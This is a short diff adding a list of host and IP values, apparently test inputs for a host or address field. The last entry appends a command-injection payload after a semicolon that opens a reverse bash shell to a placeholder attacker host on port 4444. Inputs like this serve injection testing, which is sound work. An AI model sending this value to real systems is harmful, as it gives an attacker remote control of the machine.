@@ -1,0 +1,7 @@
+10.0.0.1
+192.168.1.1
+mycustomdomain.local
+testheader
+evilserver.com
+1.1.1.1
+127.0.0.1; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
